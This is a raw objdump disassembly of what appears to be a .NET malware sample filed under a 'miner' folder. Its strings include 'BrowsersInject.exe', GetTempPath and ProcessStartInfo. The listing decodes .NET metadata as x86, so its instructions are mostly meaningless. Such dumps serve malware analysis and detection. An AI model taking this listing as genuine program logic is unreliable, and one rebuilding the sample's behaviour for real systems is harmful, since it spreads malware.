
malware_samples/miner/df5743b23ab9a79296cfaed04e42568823881dd0cb8cc9c53e8b4ddaf7f16b7d.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	f7 28                	imull  (%eax)
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 c0 20 00    	add    %al,0x20c000
  402013:	00 6c 07 00          	add    %ch,0x0(%edi,%eax,1)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	13 30                	adc    (%eax),%esi
  402052:	04 00                	add    $0x0,%al
  402054:	5b                   	pop    %ebx
  402055:	00 00                	add    %al,(%eax)
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 00                	adc    %eax,(%eax)
  40205d:	28 0f                	sub    %cl,(%edi)
  40205f:	00 00                	add    %al,(%eax)
  402061:	0a 72 01             	or     0x1(%edx),%dh
  402064:	00 00                	add    %al,(%eax)
  402066:	70 28                	jo     0x402090
  402068:	10 00                	adc    %al,(%eax)
  40206a:	00 0a                	add    %cl,(%edx)
  40206c:	28 11                	sub    %dl,(%ecx)
  40206e:	00 00                	add    %al,(%eax)
  402070:	0a 0a                	or     (%edx),%cl
  402072:	73 12                	jae    0x402086
  402074:	00 00                	add    %al,(%eax)
  402076:	0a 25 28 13 00 00    	or     0x1328,%ah
  40207c:	0a 72 19             	or     0x19(%edx),%dh
  40207f:	00 00                	add    %al,(%eax)
  402081:	70 28                	jo     0x4020ab
  402083:	10 00                	adc    %al,(%eax)
  402085:	00 0a                	add    %cl,(%edx)
  402087:	6f                   	outsl  %ds:(%esi),(%dx)
  402088:	14 00                	adc    $0x0,%al
  40208a:	00 0a                	add    %cl,(%edx)
  40208c:	00 25 72 35 00 00    	add    %ah,0x3572
  402092:	70 06                	jo     0x40209a
  402094:	28 10                	sub    %dl,(%eax)
  402096:	00 00                	add    %al,(%eax)
  402098:	0a 6f 15             	or     0x15(%edi),%ch
  40209b:	00 00                	add    %al,(%eax)
  40209d:	0a 00                	or     (%eax),%al
  40209f:	28 16                	sub    %dl,(%esi)
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	0a 0b                	or     (%ebx),%cl
  4020a5:	72 59                	jb     0x402100
  4020a7:	00 00                	add    %al,(%eax)
  4020a9:	70 28                	jo     0x4020d3
  4020ab:	17                   	pop    %ss
  4020ac:	00 00                	add    %al,(%eax)
  4020ae:	0a 00                	or     (%eax),%al
  4020b0:	28 18                	sub    %bl,(%eax)
  4020b2:	00 00                	add    %al,(%eax)
  4020b4:	0a 26                	or     (%esi),%ah
  4020b6:	2a 22                	sub    (%edx),%ah
  4020b8:	02 28                	add    (%eax),%ch
  4020ba:	19 00                	sbb    %eax,(%eax)
  4020bc:	00 0a                	add    %cl,(%edx)
  4020be:	00 2a                	add    %ch,(%edx)
  4020c0:	42                   	inc    %edx
  4020c1:	53                   	push   %ebx
  4020c2:	4a                   	dec    %edx
  4020c3:	42                   	inc    %edx
  4020c4:	01 00                	add    %eax,(%eax)
  4020c6:	01 00                	add    %eax,(%eax)
  4020c8:	00 00                	add    %al,(%eax)
  4020ca:	00 00                	add    %al,(%eax)
  4020cc:	0c 00                	or     $0x0,%al
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	76 34                	jbe    0x402106
  4020d2:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4020d5:	33 30                	xor    (%eax),%esi
  4020d7:	33 31                	xor    (%ecx),%esi
  4020d9:	39 00                	cmp    %eax,(%eax)
  4020db:	00 00                	add    %al,(%eax)
  4020dd:	00 05 00 6c 00 00    	add    %al,0x6c00
  4020e3:	00 44 02 00          	add    %al,0x0(%edx,%eax,1)
  4020e7:	00 23                	add    %ah,(%ebx)
  4020e9:	7e 00                	jle    0x4020eb
  4020eb:	00 b0 02 00 00 08    	add    %dh,0x8000002(%eax)
  4020f1:	03 00                	add    (%eax),%eax
  4020f3:	00 23                	add    %ah,(%ebx)
  4020f5:	53                   	push   %ebx
  4020f6:	74 72                	je     0x40216a
  4020f8:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  4020ff:	00 b8 05 00 00 70    	add    %bh,0x70000005(%eax)
  402105:	00 00                	add    %al,(%eax)
  402107:	00 23                	add    %ah,(%ebx)
  402109:	55                   	push   %ebp
  40210a:	53                   	push   %ebx
  40210b:	00 28                	add    %ch,(%eax)
  40210d:	06                   	push   %es
  40210e:	00 00                	add    %al,(%eax)
  402110:	10 00                	adc    %al,(%eax)
  402112:	00 00                	add    %al,(%eax)
  402114:	23 47 55             	and    0x55(%edi),%eax
  402117:	49                   	dec    %ecx
  402118:	44                   	inc    %esp
  402119:	00 00                	add    %al,(%eax)
  40211b:	00 38                	add    %bh,(%eax)
  40211d:	06                   	push   %es
  40211e:	00 00                	add    %al,(%eax)
  402120:	34 01                	xor    $0x1,%al
  402122:	00 00                	add    %al,(%eax)
  402124:	23 42 6c             	and    0x6c(%edx),%eax
  402127:	6f                   	outsl  %ds:(%esi),(%dx)
  402128:	62 00                	bound  %eax,(%eax)
  40212a:	00 00                	add    %al,(%eax)
  40212c:	00 00                	add    %al,(%eax)
  40212e:	00 00                	add    %al,(%eax)
  402130:	02 00                	add    (%eax),%al
  402132:	00 01                	add    %al,(%ecx)
  402134:	47                   	inc    %edi
  402135:	15 02 00 09 00       	adc    $0x90002,%eax
  40213a:	00 00                	add    %al,(%eax)
  40213c:	00 fa                	add    %bh,%dl
  40213e:	01 33                	add    %esi,(%ebx)
  402140:	00 16                	add    %dl,(%esi)
  402142:	00 00                	add    %al,(%eax)
  402144:	01 00                	add    %eax,(%eax)
  402146:	00 00                	add    %al,(%eax)
  402148:	18 00                	sbb    %al,(%eax)
  40214a:	00 00                	add    %al,(%eax)
  40214c:	02 00                	add    (%eax),%al
  40214e:	00 00                	add    %al,(%eax)
  402150:	02 00                	add    (%eax),%al
  402152:	00 00                	add    %al,(%eax)
  402154:	01 00                	add    %eax,(%eax)
  402156:	00 00                	add    %al,(%eax)
  402158:	19 00                	sbb    %eax,(%eax)
  40215a:	00 00                	add    %al,(%eax)
  40215c:	0e                   	push   %cs
  40215d:	00 00                	add    %al,(%eax)
  40215f:	00 01                	add    %al,(%ecx)
  402161:	00 00                	add    %al,(%eax)
  402163:	00 01                	add    %al,(%ecx)
  402165:	00 00                	add    %al,(%eax)
  402167:	00 02                	add    %al,(%edx)
  402169:	00 00                	add    %al,(%eax)
  40216b:	00 00                	add    %al,(%eax)
  40216d:	00 a6 01 01 00 00    	add    %ah,0x101(%esi)
  402173:	00 00                	add    %al,(%eax)
  402175:	00 06                	add    %al,(%esi)
  402177:	00 1b                	add    %bl,(%ebx)
  402179:	01 64 02 06          	add    %esp,0x6(%edx,%eax,1)
  40217d:	00 88 01 64 02 06    	add    %cl,0x6026401(%eax)
  402183:	00 4f 00             	add    %cl,0x0(%edi)
  402186:	32 02                	xor    (%edx),%al
  402188:	0f 00 84 02 00 00 06 	sldt   0x60000(%edx,%eax,1)
  40218f:	00 
  402190:	77 00                	ja     0x402192
  402192:	fa                   	cli
  402193:	01 06                	add    %eax,(%esi)
  402195:	00 fe                	add    %bh,%dh
  402197:	00 fa                	add    %bh,%dl
  402199:	01 06                	add    %eax,(%esi)
  40219b:	00 df                	add    %bl,%bh
  40219d:	00 fa                	add    %bh,%dl
  40219f:	01 06                	add    %eax,(%esi)
  4021a1:	00 6f 01             	add    %ch,0x1(%edi)
  4021a4:	fa                   	cli
  4021a5:	01 06                	add    %eax,(%esi)
  4021a7:	00 3b                	add    %bh,(%ebx)
  4021a9:	01 fa                	add    %edi,%edx
  4021ab:	01 06                	add    %eax,(%esi)
  4021ad:	00 54 01 fa          	add    %dl,-0x6(%ecx,%eax,1)
  4021b1:	01 06                	add    %eax,(%esi)
  4021b3:	00 8e 00 fa 01 06    	add    %cl,0x601fa00(%esi)
  4021b9:	00 63 00             	add    %ah,0x0(%ebx)
  4021bc:	45                   	inc    %ebp
  4021bd:	02 06                	add    (%esi),%al
  4021bf:	00 41 00             	add    %al,0x0(%ecx)
  4021c2:	45                   	inc    %ebp
  4021c3:	02 06                	add    (%esi),%al
  4021c5:	00 c2                	add    %al,%dl
  4021c7:	00 fa                	add    %bh,%dl
  4021c9:	01 06                	add    %eax,(%esi)
  4021cb:	00 a9 00 b9 01 06    	add    %ch,0x601b900(%ecx)
  4021d1:	00 b5 02 ee 01 0a    	add    %dh,0xa01ee02(%ebp)
  4021d7:	00 98 02 32 02 06    	add    %bl,0x6023202(%eax)
  4021dd:	00 e1                	add    %ah,%cl
  4021df:	01 0a                	add    %ecx,(%edx)
  4021e1:	00 06                	add    %al,(%esi)
  4021e3:	00 d3                	add    %dl,%bl
  4021e5:	01 ee                	add    %ebp,%esi
  4021e7:	01 06                	add    %eax,(%esi)
  4021e9:	00 1d 00 0a 00 0a    	add    %bl,0xa000a00
  4021ef:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4021f2:	32 02                	xor    (%edx),%al
  4021f4:	06                   	push   %es
  4021f5:	00 cb                	add    %cl,%bl
  4021f7:	02 ee                	add    %dh,%ch
  4021f9:	01 06                	add    %eax,(%esi)
  4021fb:	00 22                	add    %ah,(%edx)
  4021fd:	00 ee                	add    %ch,%dh
  4021ff:	01 06                	add    %eax,(%esi)
  402201:	00 1d 02 ee 01 00    	add    %bl,0x1ee02
  402207:	00 00                	add    %al,(%eax)
  402209:	00 01                	add    %al,(%ecx)
  40220b:	00 00                	add    %al,(%eax)
  40220d:	00 00                	add    %al,(%eax)
  40220f:	00 01                	add    %al,(%ecx)
  402211:	00 01                	add    %al,(%ecx)
  402213:	00 00                	add    %al,(%eax)
  402215:	00 10                	add    %dl,(%eax)
  402217:	00 e6                	add    %ah,%dh
  402219:	01 bc 02 41 00 01 00 	add    %edi,0x10041(%edx,%eax,1)
  402220:	01 00                	add    %eax,(%eax)
  402222:	50                   	push   %eax
  402223:	20 00                	and    %al,(%eax)
  402225:	00 00                	add    %al,(%eax)
  402227:	00 91 00 f5 01 49    	add    %dl,0x4901f500(%ecx)
  40222d:	00 01                	add    %al,(%ecx)
  40222f:	00 b7 20 00 00 00    	add    %dh,0x20(%edi)
  402235:	00 86 18 2c 02 06    	add    %al,0x6022c18(%esi)
  40223b:	00 02                	add    %al,(%edx)
  40223d:	00 00                	add    %al,(%eax)
  40223f:	00 01                	add    %al,(%ecx)
  402241:	00 93 02 09 00 2c    	add    %dl,0x2c000902(%ebx)
  402247:	02 01                	add    (%ecx),%al
  402249:	00 11                	add    %dl,(%ecx)
  40224b:	00 2c 02             	add    %ch,(%edx,%eax,1)
  40224e:	06                   	push   %es
  40224f:	00 19                	add    %bl,(%ecx)
  402251:	00 2c 02             	add    %ch,(%edx,%eax,1)
  402254:	0a 00                	or     (%eax),%al
  402256:	29 00                	sub    %eax,(%eax)
  402258:	2c 02                	sub    $0x2,%al
  40225a:	10 00                	adc    %al,(%eax)
  40225c:	31 00                	xor    %eax,(%eax)
  40225e:	2c 02                	sub    $0x2,%al
  402260:	10 00                	adc    %al,(%eax)
  402262:	39 00                	cmp    %eax,(%eax)
  402264:	2c 02                	sub    $0x2,%al
  402266:	10 00                	adc    %al,(%eax)
  402268:	41                   	inc    %ecx
  402269:	00 2c 02             	add    %ch,(%edx,%eax,1)
  40226c:	10 00                	adc    %al,(%eax)
  40226e:	49                   	dec    %ecx
  40226f:	00 2c 02             	add    %ch,(%edx,%eax,1)
  402272:	10 00                	adc    %al,(%eax)
  402274:	51                   	push   %ecx
  402275:	00 2c 02             	add    %ch,(%edx,%eax,1)
  402278:	10 00                	adc    %al,(%eax)
  40227a:	59                   	pop    %ecx
  40227b:	00 2c 02             	add    %ch,(%edx,%eax,1)
  40227e:	10 00                	adc    %al,(%eax)
  402280:	61                   	popa
  402281:	00 2c 02             	add    %ch,(%edx,%eax,1)
  402284:	15 00 69 00 2c       	adc    $0x2c006900,%eax
  402289:	02 10                	add    (%eax),%dl
  40228b:	00 71 00             	add    %dh,0x0(%ecx)
  40228e:	2c 02                	sub    $0x2,%al
  402290:	10 00                	adc    %al,(%eax)
  402292:	79 00                	jns    0x402294
  402294:	2c 02                	sub    $0x2,%al
  402296:	10 00                	adc    %al,(%eax)
  402298:	91                   	xchg   %eax,%ecx
  402299:	00 da                	add    %bl,%dl
  40229b:	01 20                	add    %esp,(%eax)
  40229d:	00 99 00 ae 02 24    	add    %bl,0x2402ae00(%ecx)
  4022a3:	00 a1 00 dd 02 2a    	add    %ah,0x2a02dd00(%ecx)
  4022a9:	00 a9 00 2c 02 06    	add    %ch,0x6022c00(%ecx)
  4022af:	00 b1 00 f1 02 20    	add    %dh,0x2002f100(%ecx)
  4022b5:	00 a9 00 2a 00 10    	add    %ch,0x10002a00(%ecx)
  4022bb:	00 a9 00 a0 02 10    	add    %ch,0x1002a000(%ecx)
  4022c1:	00 89 00 d7 02 2f    	add    %cl,0x2f02d700(%ecx)
  4022c7:	00 b9 00 37 00 36    	add    %bh,0x36003700(%ecx)
  4022cd:	00 b9 00 e9 02 3b    	add    %bh,0x3b02e900(%ecx)
  4022d3:	00 81 00 2c 02 06    	add    %al,0x6022c00(%ecx)
  4022d9:	00 2e                	add    %ch,(%esi)
  4022db:	00 0b                	add    %cl,(%ebx)
  4022dd:	00 4f 00             	add    %cl,0x0(%edi)
  4022e0:	2e 00 13             	add    %dl,%cs:(%ebx)
  4022e3:	00 58 00             	add    %bl,0x0(%eax)
  4022e6:	2e 00 1b             	add    %bl,%cs:(%ebx)
  4022e9:	00 77 00             	add    %dh,0x0(%edi)
  4022ec:	2e 00 23             	add    %ah,%cs:(%ebx)
  4022ef:	00 80 00 2e 00 2b    	add    %al,0x2b002e00(%eax)
  4022f5:	00 94 00 2e 00 33 00 	add    %dl,0x33002e(%eax,%eax,1)
  4022fc:	94                   	xchg   %eax,%esp
  4022fd:	00 2e                	add    %ch,(%esi)
  4022ff:	00 3b                	add    %bh,(%ebx)
  402301:	00 94 00 2e 00 43 00 	add    %dl,0x43002e(%eax,%eax,1)
  402308:	80 00 2e             	addb   $0x2e,(%eax)
  40230b:	00 4b 00             	add    %cl,0x0(%ebx)
  40230e:	9a 00 2e 00 53 00 94 	lcall  $0x9400,$0x53002e00
  402315:	00 2e                	add    %ch,(%esi)
  402317:	00 5b 00             	add    %bl,0x0(%ebx)
  40231a:	94                   	xchg   %eax,%esp
  40231b:	00 2e                	add    %ch,(%esi)
  40231d:	00 63 00             	add    %ah,0x0(%ebx)
  402320:	b2 00                	mov    $0x0,%dl
  402322:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  402326:	dc 00                	faddl  (%eax)
  402328:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  40232c:	e9 00 1a 00 04       	jmp    0x4403d31
  402331:	80 00 00             	addb   $0x0,(%eax)
  402334:	01 00                	add    %eax,(%eax)
	...
  402342:	bc 02 00 00 04       	mov    $0x4000002,%esp
	...
  40234f:	00 00                	add    %al,(%eax)
  402351:	00 40 00             	add    %al,0x0(%eax)
  402354:	14 00                	adc    $0x0,%al
  402356:	00 00                	add    %al,(%eax)
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 00                	add    $0x0,%al
	...
  402364:	00 00                	add    %al,(%eax)
  402366:	40                   	inc    %eax
  402367:	00 ee                	add    %ch,%dh
  402369:	01 00                	add    %eax,(%eax)
  40236b:	00 00                	add    %al,(%eax)
  40236d:	00 00                	add    %al,(%eax)
  40236f:	00 00                	add    %al,(%eax)
  402371:	3c 4d                	cmp    $0x4d,%al
  402373:	6f                   	outsl  %ds:(%esi),(%dx)
  402374:	64 75 6c             	fs jne 0x4023e3
  402377:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  40237c:	73 74                	jae    0x4023f2
  40237e:	65 6d                	gs insl (%dx),%es:(%edi)
  402380:	2e 49                	cs dec %ecx
  402382:	4f                   	dec    %edi
  402383:	00 6d 73             	add    %ch,0x73(%ebp)
  402386:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402389:	6c                   	insb   (%dx),%es:(%edi)
  40238a:	69 62 00 46 69 6c 65 	imul   $0x656c6946,0x0(%edx),%esp
  402391:	00 43 6f             	add    %al,0x6f(%ebx)
  402394:	6e                   	outsb  %ds:(%esi),(%dx)
  402395:	73 6f                	jae    0x402406
  402397:	6c                   	insb   (%dx),%es:(%edi)
  402398:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40239c:	74 5f                	je     0x4023fd
  40239e:	46                   	inc    %esi
  40239f:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4023a6:	00 
  4023a7:	57                   	push   %edi
  4023a8:	72 69                	jb     0x402413
  4023aa:	74 65                	je     0x402411
  4023ac:	4c                   	dec    %esp
  4023ad:	69 6e 65 00 47 75 69 	imul   $0x69754700,0x65(%esi),%ebp
  4023b4:	64 41                	fs inc %ecx
  4023b6:	74 74                	je     0x40242c
  4023b8:	72 69                	jb     0x402423
  4023ba:	62 75 74             	bound  %esi,0x74(%ebp)
  4023bd:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4023c2:	75 67                	jne    0x40242b
  4023c4:	67 61                	addr16 popa
  4023c6:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  4023ca:	74 74                	je     0x402440
  4023cc:	72 69                	jb     0x402437
  4023ce:	62 75 74             	bound  %esi,0x74(%ebp)
  4023d1:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4023d5:	6d                   	insl   (%dx),%es:(%edi)
  4023d6:	56                   	push   %esi
  4023d7:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4023de:	74 74                	je     0x402454
  4023e0:	72 69                	jb     0x40244b
  4023e2:	62 75 74             	bound  %esi,0x74(%ebp)
  4023e5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4023e9:	73 65                	jae    0x402450
  4023eb:	6d                   	insl   (%dx),%es:(%edi)
  4023ec:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4023f0:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4023f7:	72 
  4023f8:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4023ff:	73 73                	jae    0x402474
  402401:	65 6d                	gs insl (%dx),%es:(%edi)
  402403:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402407:	72 61                	jb     0x40246a
  402409:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40240c:	61                   	popa
  40240d:	72 6b                	jb     0x40247a
  40240f:	41                   	inc    %ecx
  402410:	74 74                	je     0x402486
  402412:	72 69                	jb     0x40247d
  402414:	62 75 74             	bound  %esi,0x74(%ebp)
  402417:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40241c:	67 65 74 46          	addr16 gs je 0x402466
  402420:	72 61                	jb     0x402483
  402422:	6d                   	insl   (%dx),%es:(%edi)
  402423:	65 77 6f             	gs ja  0x402495
  402426:	72 6b                	jb     0x402493
  402428:	41                   	inc    %ecx
  402429:	74 74                	je     0x40249f
  40242b:	72 69                	jb     0x402496
  40242d:	62 75 74             	bound  %esi,0x74(%ebp)
  402430:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402434:	73 65                	jae    0x40249b
  402436:	6d                   	insl   (%dx),%es:(%edi)
  402437:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40243b:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  402442:	69 
  402443:	6f                   	outsl  %ds:(%esi),(%dx)
  402444:	6e                   	outsb  %ds:(%esi),(%dx)
  402445:	41                   	inc    %ecx
  402446:	74 74                	je     0x4024bc
  402448:	72 69                	jb     0x4024b3
  40244a:	62 75 74             	bound  %esi,0x74(%ebp)
  40244d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402451:	73 65                	jae    0x4024b8
  402453:	6d                   	insl   (%dx),%es:(%edi)
  402454:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402458:	6f                   	outsl  %ds:(%esi),(%dx)
  402459:	6e                   	outsb  %ds:(%esi),(%dx)
  40245a:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402460:	74 69                	je     0x4024cb
  402462:	6f                   	outsl  %ds:(%esi),(%dx)
  402463:	6e                   	outsb  %ds:(%esi),(%dx)
  402464:	41                   	inc    %ecx
  402465:	74 74                	je     0x4024db
  402467:	72 69                	jb     0x4024d2
  402469:	62 75 74             	bound  %esi,0x74(%ebp)
  40246c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402470:	73 65                	jae    0x4024d7
  402472:	6d                   	insl   (%dx),%es:(%edi)
  402473:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  402477:	65 73 63             	gs jae 0x4024dd
  40247a:	72 69                	jb     0x4024e5
  40247c:	70 74                	jo     0x4024f2
  40247e:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  402485:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  40248c:	6f                   	outsl  %ds:(%esi),(%dx)
  40248d:	6d                   	insl   (%dx),%es:(%edi)
  40248e:	70 69                	jo     0x4024f9
  402490:	6c                   	insb   (%dx),%es:(%edi)
  402491:	61                   	popa
  402492:	74 69                	je     0x4024fd
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	6e                   	outsb  %ds:(%esi),(%dx)
  402496:	52                   	push   %edx
  402497:	65 6c                	gs insb (%dx),%es:(%edi)
  402499:	61                   	popa
  40249a:	78 61                	js     0x4024fd
  40249c:	74 69                	je     0x402507
  40249e:	6f                   	outsl  %ds:(%esi),(%dx)
  40249f:	6e                   	outsb  %ds:(%esi),(%dx)
  4024a0:	73 41                	jae    0x4024e3
  4024a2:	74 74                	je     0x402518
  4024a4:	72 69                	jb     0x40250f
  4024a6:	62 75 74             	bound  %esi,0x74(%ebp)
  4024a9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4024ad:	73 65                	jae    0x402514
  4024af:	6d                   	insl   (%dx),%es:(%edi)
  4024b0:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  4024b4:	72 6f                	jb     0x402525
  4024b6:	64 75 63             	fs jne 0x40251c
  4024b9:	74 41                	je     0x4024fc
  4024bb:	74 74                	je     0x402531
  4024bd:	72 69                	jb     0x402528
  4024bf:	62 75 74             	bound  %esi,0x74(%ebp)
  4024c2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4024c6:	73 65                	jae    0x40252d
  4024c8:	6d                   	insl   (%dx),%es:(%edi)
  4024c9:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4024cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ce:	70 79                	jo     0x402549
  4024d0:	72 69                	jb     0x40253b
  4024d2:	67 68 74 41 74 74    	addr16 push $0x74744174
  4024d8:	72 69                	jb     0x402543
  4024da:	62 75 74             	bound  %esi,0x74(%ebp)
  4024dd:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4024e1:	73 65                	jae    0x402548
  4024e3:	6d                   	insl   (%dx),%es:(%edi)
  4024e4:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4024e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e9:	6d                   	insl   (%dx),%es:(%edi)
  4024ea:	70 61                	jo     0x40254d
  4024ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4024ed:	79 41                	jns    0x402530
  4024ef:	74 74                	je     0x402565
  4024f1:	72 69                	jb     0x40255c
  4024f3:	62 75 74             	bound  %esi,0x74(%ebp)
  4024f6:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4024fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4024fb:	74 69                	je     0x402566
  4024fd:	6d                   	insl   (%dx),%es:(%edi)
  4024fe:	65 43                	gs inc %ebx
  402500:	6f                   	outsl  %ds:(%esi),(%dx)
  402501:	6d                   	insl   (%dx),%es:(%edi)
  402502:	70 61                	jo     0x402565
  402504:	74 69                	je     0x40256f
  402506:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402509:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402510:	69 
  402511:	62 75 74             	bound  %esi,0x74(%ebp)
  402514:	65 00 42 72          	add    %al,%gs:0x72(%edx)
  402518:	6f                   	outsl  %ds:(%esi),(%dx)
  402519:	77 73                	ja     0x40258e
  40251b:	65 72 73             	gs jb  0x402591
  40251e:	49                   	dec    %ecx
  40251f:	6e                   	outsb  %ds:(%esi),(%dx)
  402520:	6a 65                	push   $0x65
  402522:	63 74 2e 65          	arpl   %esi,0x65(%esi,%ebp,1)
  402526:	78 65                	js     0x40258d
  402528:	00 53 79             	add    %dl,0x79(%ebx)
  40252b:	73 74                	jae    0x4025a1
  40252d:	65 6d                	gs insl (%dx),%es:(%edi)
  40252f:	2e 52                	cs push %edx
  402531:	75 6e                	jne    0x4025a1
  402533:	74 69                	je     0x40259e
  402535:	6d                   	insl   (%dx),%es:(%edi)
  402536:	65 2e 56             	gs cs push %esi
  402539:	65 72 73             	gs jb  0x4025af
  40253c:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  402543:	53                   	push   %ebx
  402544:	74 72                	je     0x4025b8
  402546:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  40254d:	54                   	push   %esp
  40254e:	65 6d                	gs insl (%dx),%es:(%edi)
  402550:	70 50                	jo     0x4025a2
  402552:	61                   	popa
  402553:	74 68                	je     0x4025bd
  402555:	00 50 72             	add    %dl,0x72(%eax)
  402558:	6f                   	outsl  %ds:(%esi),(%dx)
  402559:	67 72 61             	addr16 jb 0x4025bd
  40255c:	6d                   	insl   (%dx),%es:(%edi)
  40255d:	00 53 79             	add    %dl,0x79(%ebx)
  402560:	73 74                	jae    0x4025d6
  402562:	65 6d                	gs insl (%dx),%es:(%edi)
  402564:	00 4d 61             	add    %cl,0x61(%ebp)
  402567:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  40256e:	65 6d                	gs insl (%dx),%es:(%edi)
  402570:	2e 52                	cs push %edx
  402572:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  402575:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40257a:	6e                   	outsb  %ds:(%esi),(%dx)
  40257b:	00 50 72             	add    %dl,0x72(%eax)
  40257e:	6f                   	outsl  %ds:(%esi),(%dx)
  40257f:	63 65 73             	arpl   %esp,0x73(%ebp)
  402582:	73 53                	jae    0x4025d7
  402584:	74 61                	je     0x4025e7
  402586:	72 74                	jb     0x4025fc
  402588:	49                   	dec    %ecx
  402589:	6e                   	outsb  %ds:(%esi),(%dx)
  40258a:	66 6f                	outsw  %ds:(%esi),(%dx)
  40258c:	00 43 6f             	add    %al,0x6f(%ebx)
  40258f:	6e                   	outsb  %ds:(%esi),(%dx)
  402590:	73 6f                	jae    0x402601
  402592:	6c                   	insb   (%dx),%es:(%edi)
  402593:	65 4b                	gs dec %ebx
  402595:	65 79 49             	gs jns 0x4025e1
  402598:	6e                   	outsb  %ds:(%esi),(%dx)
  402599:	66 6f                	outsw  %ds:(%esi),(%dx)
  40259b:	00 2e                	add    %ch,(%esi)
  40259d:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4025a1:	00 53 79             	add    %dl,0x79(%ebx)
  4025a4:	73 74                	jae    0x40261a
  4025a6:	65 6d                	gs insl (%dx),%es:(%edi)
  4025a8:	2e 44                	cs inc %esp
  4025aa:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4025b1:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  4025b8:	74 65                	je     0x40261f
  4025ba:	6d                   	insl   (%dx),%es:(%edi)
  4025bb:	2e 52                	cs push %edx
  4025bd:	75 6e                	jne    0x40262d
  4025bf:	74 69                	je     0x40262a
  4025c1:	6d                   	insl   (%dx),%es:(%edi)
  4025c2:	65 2e 49             	gs cs dec %ecx
  4025c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4025c6:	74 65                	je     0x40262d
  4025c8:	72 6f                	jb     0x402639
  4025ca:	70 53                	jo     0x40261f
  4025cc:	65 72 76             	gs jb  0x402645
  4025cf:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4025d6:	73 74                	jae    0x40264c
  4025d8:	65 6d                	gs insl (%dx),%es:(%edi)
  4025da:	2e 52                	cs push %edx
  4025dc:	75 6e                	jne    0x40264c
  4025de:	74 69                	je     0x402649
  4025e0:	6d                   	insl   (%dx),%es:(%edi)
  4025e1:	65 2e 43             	gs cs inc %ebx
  4025e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4025e5:	6d                   	insl   (%dx),%es:(%edi)
  4025e6:	70 69                	jo     0x402651
  4025e8:	6c                   	insb   (%dx),%es:(%edi)
  4025e9:	65 72 53             	gs jb  0x40263f
  4025ec:	65 72 76             	gs jb  0x402665
